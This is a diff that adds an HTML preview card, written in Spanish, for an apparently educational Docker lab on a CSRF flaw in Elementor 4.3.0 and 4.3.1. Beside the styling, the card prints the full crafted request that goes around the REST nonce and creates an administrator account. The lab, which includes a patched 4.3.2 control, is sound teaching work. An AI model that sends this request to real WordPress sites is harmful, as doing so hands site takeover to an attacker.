@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="es">
+<head><meta charset="utf-8"><style>
+  html,body{margin:0;padding:0;width:1200px;height:630px;overflow:hidden}
+  .card{width:1200px;height:630px;background:
+      radial-gradient(900px 500px at 85% -10%, #103049 0%, transparent 60%),
+      linear-gradient(160deg,#0b1220 0%,#0d1526 55%,#0a101c 100%);
+    color:#e2e8f0;font-family:ui-monospace,'SF Mono',Menlo,Consolas,monospace;
+    display:flex;flex-direction:column;justify-content:center;padding:0 72px;
+    box-sizing:border-box;position:relative}
+  .k{color:#fbbf24}
+  .bad{color:#f87171;font-weight:700}
+  h1{font-size:58px;margin:0 0 18px;letter-spacing:-1px}
+  h1 span{color:#38bdf8}
+  .url{font-size:26px;background:#0a0f1c;border:1px solid #1e293b;border-radius:12px;
+    padding:18px 22px;color:#94a3b8;line-height:1.5}
+  .badges{display:flex;gap:12px;margin-top:30px;font-size:19px}
+  .b{border:1px solid #334155;border-radius:999px;padding:8px 18px;background:#111a2c}
+  .b.red{color:#f87171;border-color:#47201f}
+  .b.green{color:#4ade80;border-color:#1f4731}
+  .foot{position:absolute;bottom:34px;left:72px;color:#64748b;font-size:17px}
+</style></head>
+<body>
+<div class="card">
+  <h1>Elementor <span>CSRF</span> Lab · <span class="bad">un clic, un admin</span></h1>
+  <div class="url">GET /wp-json/wp/v2/users?_method=POST&amp;username=csrfadmin<br>
+      &amp;roles[]=administrator&amp;<span class="k">x=elementor/v1/events/</span></div>
+  <div class="badges">
+    <span class="b red">Elementor 4.3.0 / 4.3.1</span>
+    <span class="b">bypass del nonce REST</span>
+    <span class="b">CVSS 8.8 · ~2M sitios</span>
+    <span class="b green">parche 4.3.2</span>
+  </div>
+  <div class="foot">Laboratorio pedagógico · Docker · control negativo 4.3.2 · 686f6c61</div>
+</div>
+</body>
+</html>
